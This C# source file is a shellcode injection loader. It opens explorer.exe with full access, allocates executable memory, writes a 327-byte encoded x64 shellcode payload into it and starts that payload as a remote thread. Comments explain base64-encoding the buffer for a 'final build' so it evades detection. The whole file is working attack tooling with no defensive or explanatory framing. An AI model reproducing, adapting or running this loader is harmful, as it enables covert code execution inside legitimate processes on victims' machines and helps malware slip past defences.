using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ShellcodeInjection
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,IntPtr lpThreadId);

        static void Main(string[] args)
        {
            // Find explorer.exe's PID from within Task Manager or other means and set it here.
            int explorerPID = 0;
            // Set hProcess as the value of the OpenProcess  Args: PROCESS_ALL_ACCESS, Can Child Process inherit this handle?, explorerPID
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, explorerPID);
            // Set addr as the value of the VirtualAllocEx ARGS: process, have API select an unused address, mem_commit, mem_reserve, page_execute_readwrite
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
            // This is our shellcode of course
            byte[] buf = new byte[327] {
0x48,0x31,0xc9,0x48,0x81,0xe9,0xdc,0xff,0xff,0xff,0x48,0x8d,0x05,0xef,0xff,
0xff,0xff,0x48,0xbb,0x55,0x39,0x75,0x30,0x65,0x09,0x7e,0x9d,0x48,0x31,0x58,
0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0xa9,0x71,0xf6,0xd4,0x95,0xe1,
0xbe,0x9d,0x55,0x39,0x34,0x61,0x24,0x59,0x2c,0xcc,0x03,0x71,0x44,0xe2,0x00,
0x41,0xf5,0xcf,0x35,0x71,0xfe,0x62,0x7d,0x41,0xf5,0xcf,0x75,0x71,0xfe,0x42,
0x35,0x41,0x71,0x2a,0x1f,0x73,0x38,0x01,0xac,0x41,0x4f,0x5d,0xf9,0x05,0x14,
0x4c,0x67,0x25,0x5e,0xdc,0x94,0xf0,0x78,0x71,0x64,0xc8,0x9c,0x70,0x07,0x78,
0x24,0x78,0xee,0x5b,0x5e,0x16,0x17,0x05,0x3d,0x31,0xb5,0x82,0xfe,0x15,0x55,
0x39,0x75,0x78,0xe0,0xc9,0x0a,0xfa,0x1d,0x38,0xa5,0x60,0xee,0x41,0x66,0xd9,
0xde,0x79,0x55,0x79,0x64,0xd9,0x9d,0xcb,0x1d,0xc6,0xbc,0x71,0xee,0x3d,0xf6,
0xd5,0x54,0xef,0x38,0x01,0xac,0x41,0x4f,0x5d,0xf9,0x78,0xb4,0xf9,0x68,0x48,
0x7f,0x5c,0x6d,0xd9,0x00,0xc1,0x29,0x0a,0x32,0xb9,0x5d,0x7c,0x4c,0xe1,0x10,
0xd1,0x26,0xd9,0xde,0x79,0x51,0x79,0x64,0xd9,0x18,0xdc,0xde,0x35,0x3d,0x74,
0xee,0x49,0x62,0xd4,0x54,0xe9,0x34,0xbb,0x61,0x81,0x36,0x9c,0x85,0x78,0x2d,
0x71,0x3d,0x57,0x27,0xc7,0x14,0x61,0x34,0x69,0x24,0x53,0x36,0x1e,0xb9,0x19,
0x34,0x62,0x9a,0xe9,0x26,0xdc,0x0c,0x63,0x3d,0xbb,0x77,0xe0,0x29,0x62,0xaa,
0xc6,0x28,0x78,0xdf,0x08,0x7e,0x9d,0x55,0x39,0x75,0x30,0x65,0x41,0xf3,0x10,
0x54,0x38,0x75,0x30,0x24,0xb3,0x4f,0x16,0x3a,0xbe,0x8a,0xe5,0xde,0xf9,0xcb,
0x3f,0x03,0x78,0xcf,0x96,0xf0,0xb4,0xe3,0x62,0x80,0x71,0xf6,0xf4,0x4d,0x35,
0x78,0xe1,0x5f,0xb9,0x8e,0xd0,0x10,0x0c,0xc5,0xda,0x46,0x4b,0x1a,0x5a,0x65,
0x50,0x3f,0x14,0x8f,0xc6,0xa0,0x40,0x0c,0x67,0x19,0xbd,0x64,0x0b,0x42,0x1e,
0x55,0x27,0x4e,0xb3,0x64,0x39,0x75,0x30,0x65,0x09,0x7e,0x9d };

            // These next two will be used to execute the shellcode after encoding. Keep these commented until you are ready to do the final build.
            //string b64DecodeMe = "";
            //byte[] buf = System.Convert.FromBase64String(b64DecodeMe);
            // Grabbing the b64 value
            string getB64FromByteArray = System.Convert.ToBase64String(buf);
            // Initialize outSize
            IntPtr outSize;
            // Write everything to the processes memory
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            // Let's execute the thread
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}
